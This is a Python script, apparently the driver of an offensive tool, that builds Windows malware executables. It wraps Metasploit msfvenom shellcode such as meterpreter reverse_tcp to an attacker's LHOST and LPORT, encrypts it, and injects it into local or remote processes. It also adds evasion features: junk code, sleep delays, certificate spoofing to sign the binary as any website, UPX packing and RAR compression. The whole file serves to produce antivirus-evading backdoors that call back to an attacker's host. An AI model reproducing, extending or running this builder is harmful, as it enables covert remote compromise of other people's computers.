from lib import builder, compiler, core, encryption, evasion
import argparse
from os import makedirs, path
from shutil import which
from subprocess import call


types = ""
arch = ""
payload = ""
custom_shellcode = ""
lhost = "lhost="
lport = "lport="
msfvenom = []
filename = ""
injection_type = ""
procname = ""
junkcode = ""
sleep = ""
req_admin = ""
final_code = ""
icon = ""


def check_requirements():
    required = ["x86_64-w64-mingw32-windres", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-windres", "i686-w64-mingw32-gcc", "rar", "msfvenom", "osslsigncode", "upx"]
    to_install = ["mingw-w64", "rar", "metasploit-framework", "osslsigncode"]
    not_installed = []
    for i in required:
        a = which(i)
        if a is None:
            core.not_installed(i)
            not_installed.append(i)

    if len(not_installed) != 0:
        for package in to_install:
            call(['apt-get', '-y', 'install', package])


def check_directory():
    directories = ["./output", "./tmp", "./icon"]
    for i in directories:
        if not path.isdir(i):
            makedirs(i)


def check_payload_requirements():
    if args.payload:
        if args.lhost:
            if args.lport:
                if args.injectiontype:
                    pass
                else:
                    core.error_payload_injectiontype()
            else:
                core.error_payload_lport()
        else:
            core.error_payload_lhost()
    elif args.shellcustom:
        pass
    else:
        core.error_payload_required()


def staged_or_no():
    is_staged_payload = "meterpreter/"
    if is_staged_payload in args.payload:
        return "yes"
    else:
        return "no"


def check_payload():
    if args.payload:
        tpayload = str(args.payload)
        return tpayload
    else:
        return ""


def check_customopt():
    msfcommand = ['msfvenom', '-a', arch, '--platform', 'windows', '-p', payload, lhost, lport, '-f', 'c']
    if args.msfcustom:
        customopt = args.msfcustom
        customopt = customopt.split(" ")
        for i in customopt:
            msfcommand.append(i)
        return msfcommand
    else:
        return msfcommand


def check_procname():
    injtype = str(args.injectiontype)
    if injtype == "remote":
        if args.procname:
            procn = str(args.procname)
            return procn
        else:
            core.error_injectiontype()
    elif injtype == "hijack":
        if args.procname:
            procn = str(args.procname)
            return procn
        else:
            core.error_injectiontype()

    elif injtype == "local":
        return ""


def junkcode_check():
    if args.junk:
        add_junk = "yes"
        return add_junk
    else:
        return ""


def check_sleep():
    if args.sleep:
        mseconds = str(args.sleep) + "000"
        sleep_stub = evasion.sleeper(mseconds)
        core.sleep_added(str(args.sleep))
        return sleep_stub
    else:
        return ""


def check_admin():
    if args.admin:
        return "yes"
    else:
        return "no"


def check_spoof():
    if args.spoof:
        remote_cert = args.spoof
        if ":" in remote_cert:
            remote_cert = remote_cert.split(":")
            evasion.spoofer(remote_cert[0], remote_cert[1], filename, "output/malware.exe")
        else:
            core.bad_certificate()
    else:
        return ""


def write_file():
    with open('tmp/source.c', 'w') as f:
        f.write(final_code)


def check_icon():
    if args.icon:
        ico = args.icon
        if ".ico" in ico:
            if len(ico) > 4:
                if path.exists("icon/" + ico):
                    return ico
                else:
                    core.error_icon_file(ico)
            else:
                core.error_icon(ico)
        else:
            core.error_icon(ico)
    else:
        return ""


def check_upx():
    if args.upx:
        compiler.upx(filename)
    else:
        return "no"


def check_compression():
    if args.compress:
        compiler.rar(filename)
    else:
        return "no"


def check_file_size():
    fs = path.getsize(filename)
    return fs


def file_size():
    if args.upx:
        core.packed_file_changes(original_file_size, packed_file_size)
    else:
        core.file_size(original_file_size)


def check_hashfile():
    if args.hash:
        hash_type = args.hash
        compiler.hash_file(filename, hash_type)


def check_mscript():
    if args.mscript:
        core.mscript(payload, lhost, lport)
    else:
        return ""


if __name__ == '__main__':
    core.banner()
    check_requirements
    check_directory()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--arch", help="Choose payload arch.", choices=["x86", "x64"], required=True)
    parser.add_argument("-p", "--payload", help="Choose the metasploit payload (ex: windows/x64/meterpreter/reverse_tcp).", required=False)
    parser.add_argument("-lh", "--lhost", help="Set your lhost (ex: 192.168.1.60).", required=False)
    parser.add_argument("-lp", "--lport", help="Set your lport (ex: 4444).", required=False)
    parser.add_argument("-cO", "--msfcustom", help="Set your own msfvenom option (ex: -cO='-e x64/xor_dynamic'.", required=False)
    parser.add_argument("-o", "--filename", help="Choose the name of the output file (ex: Malware).", required=True)
    parser.add_argument("-it", "--injectiontype", help="Set injection method (remote only for x64 architechture.)", choices=["local", "remote", "hijack"], required=True)
    parser.add_argument("-pn", "--procname", help="Choose process to inject shellcode for remote injection method (default/ex: explorer.exe).", required=False)
    parser.add_argument("-j", "--junk", help="Inject junkcode everywhere.", action='store_true', required=False)
    parser.add_argument("-s", "--sleep", help="Indicate the number of seconds to sleep before the execution of the payload and command.", required=False)
    parser.add_argument("-A", "--admin", help="Administrator privileges are required to run the program.", action='store_true', required=False)
    parser.add_argument("-sc", "--spoof", help="Creates a spoofed certificate of any online website and signs the PE (ex: www.test.com:443).", required=False)
    parser.add_argument("-i", "--icon", help="Add your icon to PE file (ex: my_icon_name.ico).", required=False)
    parser.add_argument("--upx", help="Pack PE file with UPX.", action='store_true', required=False)
    parser.add_argument("--compress", help="Compress PE file with RAR.", action='store_true', required=False)
    parser.add_argument("--hash", help="Get hash file.", choices=["sha256", "md5"], required=False)
    parser.add_argument("-ms", "--mscript", help="Run pre-configured MsfConsole.", action='store_true', required=False)
    args = parser.parse_args()

    check_payload_requirements()
    types += staged_or_no()
    arch += str(args.arch)
    payload += check_payload()
    lhost += str(args.lhost)
    lport += str(args.lport)
    msfvenom += check_customopt()
    vshellcode, decoder_stub = encryption.shellcode_generation(msfvenom)
    filename += "output/" + str(args.filename) + ".exe"
    injection_type += str(args.injectiontype)
    procname += check_procname()
    junkcode += junkcode_check()
    sleep += check_sleep()
    req_admin += check_admin()
    final_code += builder.exercise_room(arch, injection_type, procname, filename, junkcode, sleep, vshellcode, decoder_stub)
    write_file()
    icon += check_icon()
    compiler.auto_compile(filename, arch, icon, req_admin)
    original_file_size = check_file_size()
    check_spoof()
    check_upx()
    packed_file_size = check_file_size()
    file_size()
    check_compression()
    check_hashfile()
    check_mscript()
